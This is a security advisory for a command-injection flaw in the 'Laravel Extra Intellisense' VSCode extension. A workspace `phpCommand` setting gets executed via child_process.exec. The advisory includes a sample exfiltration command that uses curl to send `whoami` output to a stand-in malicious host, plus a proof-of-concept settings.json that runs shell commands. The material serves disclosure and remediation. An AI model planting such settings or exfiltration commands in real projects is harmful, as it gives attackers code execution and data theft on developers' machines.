- Vulnerability Name: Remote Code Execution via `phpCommand` Configuration

- Description:
    1. A malicious actor crafts a workspace configuration (e.g., `.vscode/settings.json`) for a Laravel project.
    2. Within this configuration, the attacker modifies the `LaravelExtraIntellisense.phpCommand` setting.
    3. Instead of a safe PHP command like `php -r "{code}"`, the attacker injects a malicious PHP command, for example: `php -r "system('curl http://malicious-site.com/$(whoami)')"`.
    4. When a developer opens this workspace in VSCode with the "Laravel Extra Intellisense" extension installed and activated, the extension periodically executes PHP commands to gather autocompletion data.
    5. The extension uses the user-provided `phpCommand` from the workspace configuration to execute PHP code.
    6. The malicious PHP command injected by the attacker is executed on the developer's machine, leading to Remote Code Execution.
    7. In the example, the `system('curl http://malicious-site.com/$(whoami)')` command will execute `curl` to send the output of the `whoami` command to `malicious-site.com`, effectively exfiltrating user information or performing other malicious actions as the user running VSCode.

- Impact:
    - Critical. Successful exploitation allows the attacker to execute arbitrary code on the developer's machine with the privileges of the user running VSCode. This can lead to:
        - Full control over the developer's machine.
        - Data exfiltration, including sensitive source code, environment variables, and credentials.
        - Installation of malware, backdoors, or ransomware.
        - Further attacks on internal networks accessible from the developer's machine.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
    - Security Note in README.md: The README.md file includes a "Security Note" that warns users about the extension running their Laravel application and suggests disabling the extension if sensitive code is present in service providers. This is a documentation-based mitigation, but it relies on the user reading and understanding the security implications.

- Missing Mitigations:
    - Input Validation: The extension lacks input validation for the `phpCommand` configuration setting. It should validate that the command is safe and does not contain potentially harmful commands or shell injections.
    - User Warning: When the extension detects a custom `phpCommand` configuration, especially if it deviates from the default, it should display a prominent warning to the user, highlighting the security risks and advising caution.
    - Secure Default: While the default `php -r "{code}"` is relatively safe, the extension could explore more secure ways to execute PHP code or restrict the capabilities of the executed commands.
    - Principle of Least Privilege: The extension should ideally not require executing arbitrary PHP code provided by the user. If PHP code execution is necessary, it should be performed with the minimum required privileges and in a sandboxed environment if possible.

- Preconditions:
    - The victim developer must have the "Laravel Extra Intellisense" VSCode extension installed.
    - The victim developer must open a workspace (Laravel project) that contains a malicious `.vscode/settings.json` file (or similar workspace configuration mechanism).
    - The attacker must be able to deliver or convince the developer to open the malicious workspace. This could be through:
        - Contributing to a public or private Laravel project with the malicious configuration.
        - Tricking the developer into downloading and opening a zip file containing the malicious workspace.
        - Social engineering to get the developer to modify their workspace configuration manually.

- Source Code Analysis:
    1. **Configuration Retrieval:** The extension retrieves the `phpCommand` setting from VSCode configuration using `vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand')` in `helpers.ts` within the `runPhp` function.

    2. **Command Execution:** The `runPhp` function in `helpers.ts` uses `child_process.exec` to execute the command constructed using the `phpCommand` setting and the PHP code to be executed.
    ```typescript
    static async runPhp(code: string, description: string|null = null) : Promise<string> {
        code = code.replace(/\"/g, "\\\"");
        if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
            code = code.replace(/\$/g, "\\$");
            code = code.replace(/\\\\'/g, '\\\\\\\\\'');
            code = code.replace(/\\\\"/g, '\\\\\\\\\"');
        }
        let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\""; // Vulnerable Line: Retrieving phpCommand from configuration
        let command = commandTemplate.replace("{code}", code); // Vulnerable Line: Constructing command without validation
        let out = new Promise<string>(function (resolve, error) {
            if (description != null) {
                Helpers.outputChannel?.info("Laravel Extra Intellisense command started: " + description);
            }

            cp.exec(command, // Vulnerable Line: Executing the command via child_process.exec
                { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
                function (err, stdout, stderr) { ... }
            );
        });
        return out;
    }
    ```
    3. **No Input Sanitization:** The code snippet shows that while there's some escaping of quotes and dollar signs, it's not sufficient to prevent command injection.  Critically, there's no validation of the `commandTemplate` retrieved from user configuration. The extension directly substitutes `{code}` into the user-provided template and executes it.

    4. **Usage in Extension Features:**  Multiple providers (`RouteProvider`, `ViewProvider`, `ConfigProvider`, etc.) use `Helpers.runLaravel` (which internally calls `Helpers.runPhp`) to execute PHP code for fetching Laravel application data for autocompletion. This means the vulnerability can be triggered by simply using the autocompletion features of the extension in a workspace with a malicious `phpCommand` configuration.

- Security Test Case:
    1. **Prerequisites:**
        - Install the "Laravel Extra Intellisense" VSCode extension.
        - Create a new empty folder to simulate a Laravel project workspace.
        - Inside this folder, create a `.vscode` folder.
        - Inside the `.vscode` folder, create a `settings.json` file.
    2. **Malicious Configuration:**
        - Open the newly created folder in VSCode.
        - Edit the `.vscode/settings.json` file and add the following configuration to set a malicious `phpCommand`:
        ```json
        {
            "LaravelExtraIntellisense.phpCommand": "php -r \"system('mkdir /tmp/vscode-laravel-rce-test'); echo 'Vulnerability Triggered'\""
        }
        ```
        - Save the `settings.json` file.
    3. **Trigger Autocompletion (or wait for background tasks):**
        - Open any file in the workspace (or create a new PHP file, e.g., `test.php`).
        - Trigger autocompletion in a PHP context where the extension attempts to fetch data (e.g., by typing `route('` or `config('`).
        - Alternatively, simply wait a short period as some providers might periodically fetch data in the background.
    4. **Verify RCE:**
        - After triggering autocompletion (or waiting), check if the command injected in `phpCommand` was executed.
        - In this test case, the command attempts to create a directory `/tmp/vscode-laravel-rce-test`.
        - Open a terminal and check if the directory `/tmp/vscode-laravel-rce-test` exists.
        - If the directory exists, it confirms that the injected PHP code was executed, demonstrating Remote Code Execution.
        - You should see "Vulnerability Triggered" in the terminal where VSCode is running or in the "Laravel Extra Intellisense" output channel if the extension logs command outputs.
